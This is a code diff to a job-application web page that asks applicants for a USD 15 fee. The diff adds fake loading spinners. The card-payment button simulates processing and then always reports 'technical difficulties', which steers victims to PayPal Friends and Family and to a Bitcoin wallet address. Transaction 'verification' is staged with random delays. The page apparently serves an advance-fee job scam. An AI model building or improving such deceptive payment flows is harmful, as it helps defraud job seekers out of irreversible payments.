@@ -684,6 +684,10 @@
                              <div class="input-group"><input type="text" class="input-field" placeholder="Cardholder Name"></div>
                              <div class="input-group currency-prefix"><input type="text" class="input-field" value="15.00" placeholder="Amount (USD)" readonly></div>
                              <button type="button" class="pay-btn" id="pay-card-btn">Pay with Card</button>
+                             <div class="loader" id="card-loader">
+                                <div class="lds-dual-ring"></div>
+                                <p class="mt-2 text-gray-600">Processing payment...</p>
+                            </div>
                         </div>
                         <div class="payment-notice" id="payment-notice">We are currently experiencing technical difficulties with card payments. Please use one of the alternative payment methods below.</div>
 
@@ -694,7 +698,7 @@
                         <div class="payment-option mt-4">
                             <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" onerror="this.style.display='none'">
                             <div>
-                                <span><strong>PayPal:</strong><br>
+                                <span class="break-words"><strong>PayPal:</strong><br>
                                 Send your payment of <strong>USD15.00</strong> to our official PayPal account: <strong>fromsouthernonline@gmail.com</strong><br>
                                 Please include your full name and "Job Application Payment" in the notes. Ensure the payment is made using the Friends and Family (F&F) option.</span>
                             </div>
@@ -704,14 +708,18 @@
                             <input type="text" id="paypal-transaction-id" class="input-field" placeholder="Enter Your PayPal Transaction ID Here">
                         </div>
                         <button type="button" class="confirm-btn" data-method="paypal">Confirm PayPal Payment & Submit</button>
+                        <div class="loader" id="paypal-loader">
+                            <div class="lds-dual-ring"></div>
+                            <p id="paypal-loader-text" class="mt-2 text-gray-600"></p>
+                        </div>
 
                         <div class="or-divider">OR</div>
                         
                         <div class="payment-option mt-4">
                             <img src="https://bitcoin.org/img/icons/opengraph.png" alt="Bitcoin Logo" onerror="this.style.display='none'">
                             <div>
-                                <span><strong>Cryptocurrency (BTC):</strong><br>
-                                Send payment of 15 USD to our official Bitcoin wallet address: <strong>bc1qhpaw0y4296p9ua75e2df9h5pqaqyt6m5au7k0m</strong><br>
+                                <span class="break-words"><strong>Cryptocurrency (BTC):</strong><br>
+                                Send payment of 15 USD to our official Bitcoin wallet address: <strong class="break-all">bc1qhpaw0y4296p9ua75e2df9h5pqaqyt6m5au7k0m</strong><br>
                                 After sending, please copy and paste the Bitcoin Transaction ID in the field below.</span>
                             </div>
                         </div>
@@ -720,13 +728,12 @@
                             <input type="text" id="bitcoin-transaction-id" class="input-field" placeholder="Enter Your Bitcoin Transaction ID Here">
                         </div>
                         <button type="button" class="confirm-btn" data-method="bitcoin">Confirm Bitcoin Payment & Submit</button>
+                        <div class="loader" id="bitcoin-loader">
+                            <div class="lds-dual-ring"></div>
+                            <p id="bitcoin-loader-text" class="mt-2 text-gray-600"></p>
+                        </div>
                     </div>
-                    
-                    <div class="loader" id="transaction-loader">
-                        <div class="lds-dual-ring"></div>
-                        <p id="transaction-loader-text" class="mt-2 text-gray-600"></p>
-                    </div>
-                    
+                                        
                     <div class="mt-8 p-4 bg-blue-100 border border-blue-300 rounded-lg">
                         <h3 class="font-bold text-lg text-blue-800">Form Submission Instructions</h3>
                         <p class="mt-2">After filling out this form, please copy all your answers and your payment transaction ID, and send them in an email to: <strong class="text-blue-600">careers@tregeriatriccare.co.uk</strong></p>
@@ -794,7 +801,19 @@
         document.getElementById('pay-card-btn').addEventListener('click', function(event) {
             event.preventDefault();
             const paymentNotice = document.getElementById('payment-notice');
-            paymentNotice.style.display = 'block';
+            const cardLoader = document.getElementById('card-loader');
+            
+            // Hide other loaders and notices
+            document.getElementById('paypal-loader').style.display = 'none';
+            document.getElementById('bitcoin-loader').style.display = 'none';
+            document.getElementById('error-message').style.display = 'none';
+
+            cardLoader.style.display = 'flex'; // Show loader
+
+            setTimeout(() => {
+                cardLoader.style.display = 'none'; // Hide loader
+                paymentNotice.style.display = 'block'; // Show notice
+            }, 2000); // Simulate processing time
         });
 
         // This function is still here for the form onsubmit but logic is in button clicks
@@ -809,20 +828,25 @@
                 
                 const paymentMethod = this.getAttribute('data-method');
                 const errorMessage = document.getElementById('error-message');
-                const transactionLoader = document.getElementById('transaction-loader');
-                const transactionLoaderText = document.getElementById('transaction-loader-text');
                 const successModal = document.getElementById('success-modal');
-
-                // Clear previous messages
+                
+                // Hide all notices and loaders first
+                document.getElementById('payment-notice').style.display = 'none';
+                document.getElementById('card-loader').style.display = 'none';
+                document.getElementById('paypal-loader').style.display = 'none';
+                document.getElementById('bitcoin-loader').style.display = 'none';
                 errorMessage.style.display = 'none';
                 
                 let transactionIdInput, transactionId;
                 let isValid = false;
+                let currentLoader, currentLoaderText;
 
                 if (paymentMethod === 'paypal') {
                     transactionIdInput = document.getElementById('paypal-transaction-id');
                     transactionId = transactionIdInput.value.trim();
-                    // Using a general validation as PayPal IDs can vary
+                    currentLoader = document.getElementById('paypal-loader');
+                    currentLoaderText = document.getElementById('paypal-loader-text');
+
                     if (!validateTransactionId(transactionId)) {
                         errorMessage.textContent = 'Invalid or empty PayPal Transaction ID. Please check the ID and try again.';
                         errorMessage.style.display = 'block';
@@ -833,7 +857,9 @@
                 } else if (paymentMethod === 'bitcoin') {
                     transactionIdInput = document.getElementById('bitcoin-transaction-id');
                     transactionId = transactionIdInput.value.trim();
-                    // Stricter validation for Bitcoin
+                    currentLoader = document.getElementById('bitcoin-loader');
+                    currentLoaderText = document.getElementById('bitcoin-loader-text');
+
                     if (!validateBitcoinTransactionId(transactionId)) {
                         errorMessage.textContent = 'Invalid Bitcoin Transaction ID. It should be a 64-character hexadecimal string.';
                         errorMessage.style.display = 'block';
@@ -844,15 +870,15 @@
                 }
 
                 if (isValid) {
-                    // Show loader
-                    transactionLoader.style.display = 'flex';
-                    transactionLoaderText.textContent = getRandomMessage(transactionMessages);
+                    // Show the correct loader
+                    currentLoader.style.display = 'flex';
+                    currentLoaderText.textContent = getRandomMessage(transactionMessages);
 
                     // Random delay between 3 to 5 seconds
                     const randomDelay = Math.random() * (5000 - 3000) + 3000;
 
                     setTimeout(() => {
-                        transactionLoader.style.display = 'none';
+                        currentLoader.style.display = 'none';
                         // Show success popup
                         successModal.classList.remove('hidden');
                         document.getElementById('application-form').reset();
